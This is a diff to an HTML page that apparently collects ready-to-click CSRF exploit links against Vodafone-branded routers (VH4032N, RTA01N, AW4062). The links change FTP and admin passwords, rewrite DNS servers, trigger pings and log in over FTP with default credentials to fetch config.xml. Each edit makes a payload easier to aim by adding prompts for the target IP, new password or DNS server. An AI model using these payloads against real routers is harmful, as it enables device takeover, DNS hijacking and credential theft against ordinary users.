@@ -196,7 +196,7 @@ Full Disclosure.org
            </a>
           </td>
           <td>
-           <a href="http://192.168.0.1/en_US/config_ftp.cgi?ftpEnabled=1&ftpUserName=vodafone&ftpPassword=vulnpass&ftpPort=21&ftpAclMode=2">
+           <a href="javascript:document.location='http://192.168.0.1/en_US/config_ftp.cgi?ftpEnabled=1&ftpUserName=vodafone&ftpPassword='+prompt('New password')+'&ftpPort=21&ftpAclMode=2'">
             VH4032N VH4032N_V0.2.35 CSRF change FTP password</a>
 			<a href="javascript:document.location='http://'+prompt('IP')+'/en_US/config_ftp.cgi?ftpEnabled=1&ftpUserName=vodafone&ftpPassword='+prompt('New password')+'&ftpPort=21&ftpAclMode=2'">
             [SET IP]
@@ -219,7 +219,7 @@ Full Disclosure.org
            </a>
           </td>
           <td>
-           <a href="http://192.168.0.1/en_US/administration.cgi?usrPassword=newpass">
+           <a href="javascript:document.location='http://192.168.0.1/en_US/administration.cgi?usrPassword='+prompt('New password')">
             VH4032N VH4032N_V0.2.35 CSRF change admin password</a>
 			<a href="javascript:document.location='http://'+prompt('IP')+'/en_US/administration.cgi?usrPassword='+prompt('New password')">
             [SET IP]
@@ -412,7 +412,7 @@ Full Disclosure.org
           <td>
 			<a href="javascript:document.location='http://192.168.1.1/form2Dns.cgi?dnsMode=%221%22&dns1=%22'+prompt('DNS1')+'%22&dns2=%22'+prompt('DNS2')+'%22&dns3=%22%22&submit.htm?dns.htm=%22Send%22&save=%22Aplicar'">
             RTA01N RTK_V2.2.13 CSRF change DNS servers</a>
-	           <a href="javascript:document.location='http://'+prompt('IP')+'/goform/formDNS?dnsMode=dnsManual&dns1='+prompt('DNS')+'&dns2=&dns3='">
+	           <a href="javascript:document.location='http://'+prompt('IP')+'/form2Dns.cgi?dnsMode=%221%22&dns1=%22'+prompt('DNS1')+'%22&dns2=%22'+prompt('DNS2')+'%22&dns3=%22%22&submit.htm?dns.htm=%22Send%22&save=%22Aplicar'">
             [SET IP]
            </a>
           </td>
@@ -477,9 +477,9 @@ Full Disclosure.org
            </a>
           </td>
           <td>
-           <a href="ftp://user:user@192.168.1.1/">
+           <a href="javascript:document.location='ftp://user:'+prompt('user password (Default: user)','user')+'@192.168.1.1/'">
             AW4062 1.4.2 Privilege Escalation via FTP file config.xml</a>
-	           <a href="javascript:document.location='ftp://user:user@'+prompt('IP')">
+	           <a href="javascript:document.location='ftp://user:'+prompt('user password (Default: user)','user')+'@'+prompt('IP')">
             [SET IP]
            </a>
           </td>
@@ -523,7 +523,7 @@ Full Disclosure.org
            </a>
           </td>
           <td>
-           <a href="javascript:document.location='http://192.168.1.1/goform/formPing?pingAddr='+prompt('IP')">
+           <a href="javascript:document.location='http://192.168.1.1/goform/formPing?pingAddr='+prompt('IP TO PING')">
             AW4062 1.4.2 CSRF ping certain IP</a>
 	           <a href="javascript:document.location='http://'+prompt('ROUTER IP')+'/goform/formPing?pingAddr='+prompt('IP TO PING')">
             [SET IP]
